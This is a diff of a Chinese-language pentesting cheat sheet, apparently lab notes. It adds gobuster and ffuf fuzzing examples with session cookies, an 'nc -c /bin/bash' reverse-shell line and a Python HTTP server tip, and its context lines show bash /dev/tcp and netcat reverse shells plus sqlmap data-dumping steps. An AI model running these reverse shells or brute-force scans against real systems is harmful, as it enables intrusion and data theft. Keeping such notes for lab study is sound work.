@@ -79,6 +79,13 @@ john -f=加密类型 -w=字典 目标文件
 #
 #dir参数用于目录和文件枚举，-x代表指定爆破的扩展文件名，和字典的内容组合实现爆破
 gobuster dir -u 'http://192.168.6.166/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,bak,jpg,txt,html
+
+
+#指定cookie和user-agent
+#--exclude-length过滤长度
+#-b过滤响应码
+########fuzz模式不能用-x指定文件类型
+gobuster fuzz -u 'http://192.168.6.166/' -c 'PHPSESSID=6kbbdns7ne5fr2a71146mio2vn' -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 1128
 ```
 
 ## wfuzz
@@ -103,6 +110,15 @@ wfuzz -c -t 200 -u 'http://192.168.6.166/scout/FUZZ/docs/' -w /usr/share/wordlis
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://192.168.6.166/thejabasshell.php?FUZZ=whoami' -fw 1
 #爆破参数值
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://192.168.6.166/thejabasshell.php?a=whoami&b=FUZZ' -fw 1
+
+
+#指定响应码-mc
+#-fs排除size大小，-fc排除状态码
+#爆破指定http头部
+-H "Cookie:cooke_value"
+-H "User-Agent:User-Agent_value"
+#例如
+ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u "http://192.168.6.158/casino/explainmepls.php?learnabout=127.0.0.1:6969/codebreakers/FUZZ" -fc 400 -fs 1128 -H "Cookie:PHPSESSID=1v29r1ecanau39c969mcbfktqq" -H "User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
 ```
 
 ## Netcat
@@ -145,9 +161,10 @@ bash -i >& /dev/tcp/192.168.6.149/5555 0>&1
 #而直接在命令行输入可以建立是因为对命令行来说这是一个显示的调用bash处理的命令，而并不会先由默认的shell(dash)解析，所以可以建立反弹shell。
 
 #或者使用nc
+nc -c /bin/bash 192.168.6.149
 nc 192.168.6.149 5555 -e /bin/bash
 nc 192.168.6.149 5555
-#有的时候版本不同，不支持-e选项，可以尝试去掉-e
+#有的时候版本不同，不支持-e选项，可以尝试去掉-e，用-c或者直接不用
 #然后用srcipt启动一个新的bash shell
 script /dev/null -c bash
 
@@ -307,14 +324,21 @@ sessions -i
 
 --colums：给出所有列名
 
---dump:加载所有当前列的数据 //尽量不用，会下载数据
+--dump:加载所有当前列的数据 //尽量不用，会加载所有数据
 
 -m txt.txt批量扫描url（不加-u）
 
 总体上以上的用法即先看有没有注入点，然后--dbs爆数据，--current-db爆当前数据库，-D xxx --tables爆表，-D xxx -T xxx --colums爆列，-D xxx -T xxx --C xxx,xxx,xxx --dump爆具体数据。
 ```
 
+## nikto
 
 
 
+## python开http
+
+```bash
+#在本地port开启一个http服务器,默认网页文件位置是当前执行命令路径
+python -m http.server port
+```
 
